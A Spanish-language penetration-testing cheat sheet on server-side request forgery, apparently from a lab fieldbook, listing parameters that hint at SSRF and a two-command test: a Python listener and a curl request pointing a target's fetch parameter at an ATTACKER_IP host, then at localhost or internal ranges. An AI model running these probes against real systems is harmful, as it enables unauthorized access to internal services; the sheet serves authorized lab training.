---
titulo: "Ssrf"
categoria: Chuletas
dificultad: Operativa
prerrequisitos:
  - ../02_metodologia/construccion_y_adaptacion_de_payloads.md
fuentes_internas:
  - ../../tools/concepts.py
fuentes_externas: []
revision: 2026-07-14
estado: revisado
---

# Ssrf

Solo para laboratorios autorizados. Sustituye variables, confirma versión y guarda salida.

## Decisión rápida

1. Confirma alcance, identidad y conectividad.
2. Parte de una señal; no ejecutes toda la tabla.
3. Predice salida y prepara un control negativo.
4. Ejecuta la prueba menos intrusiva.
5. Registra evidencia y vuelve al módulo si falla.

## Señales

- Un parametro llamado url, webhook, avatar, import, feed o callback.
- La app describe una funcion de 'importar desde URL' o 'verificar disponibilidad'.

## Comandos y pruebas

| Prueba | Objetivo/contexto | Evidencia esperada |
|---|---|---|
| `python3 -m http.server 8000` | Levanta un listener propio para confirmar el SSRF sin ambiguedad: si te llega la peticion, sabes con certeza que el servidor sigue URLs que tu controlas. | El listener queda a la escucha. Combinalo con el siguiente comando para disparar la peticion desde el servidor. |
| `curl -sS "$URL/fetch?url=http://ATTACKER_IP:8000/"` | Dispara el SSRF apuntando al tu propio listener. Es la prueba minima y segura antes de tocar localhost o redes internas. | Una peticion GET registrada en tu `python3 -m http.server`. Confirmado esto, repite el mismo parametro apuntando a 127.0.0.1 o al rango interno. |

## Diagnóstico

| Síntoma | Comprobar |
|---|---|
| Sin respuesta | ruta, DNS, puerto, listener y firewall |
| Rechazo | sintaxis, credenciales, permisos y versión |
| Salida distinta | control negativo, caché y estado |
| Resultado parcial | identidad efectiva y precondiciones |

## Cierre

- Guardar comando adaptado y salida.
- Anotar qué confirma y qué no.
- No persistir secretos en notas compartidas.
- Restaurar cambios del laboratorio.

Fuente operativa: [conceptos de Fieldbook](../../tools/concepts.py). Método: [construcción de payloads](../02_metodologia/construccion_y_adaptacion_de_payloads.md).
